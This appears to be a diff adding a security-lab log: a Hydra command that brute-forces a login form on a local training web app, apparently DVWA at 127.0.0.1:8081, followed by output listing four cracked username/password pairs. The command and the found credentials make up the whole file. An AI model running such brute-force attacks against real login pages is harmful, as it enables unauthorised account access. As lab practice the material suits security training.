@@ -1,0 +1,11 @@
+hydra -L users.txt -P passwords.txt 127.0.0.1 -s 8081 \
+  http-get-form \
+  '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie\:\ security=low;PHPSESSID=g8b4gn26e3hlq3bi424qfbkf37:H=Accept-Encoding\:\ identity' \
+  -t 1 -V -I -o hydra_full.txt
+
+# Hydra v9.2 run at 2025-10-03 06:35:53 on 127.0.0.1 http-get-form (hydra -L users.txt -P passwords.txt -s 8081 -t 1 -V -I -o hydra_full.txt 127.0.0.1 http-get-form /vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie\:\ security=low;PHPSESSID=g8b4gn26e3hlq3bi424qfbkf37:H=Accept-Encoding\:\ identity)
+[8081][http-get-form] host: 127.0.0.1   login: admin   password: password
+[8081][http-get-form] host: 127.0.0.1   login: gordonb   password: abc123
+[8081][http-get-form] host: 127.0.0.1   login: pablo   password: letmein
+[8081][http-get-form] host: 127.0.0.1   login: smithy   password: password
+
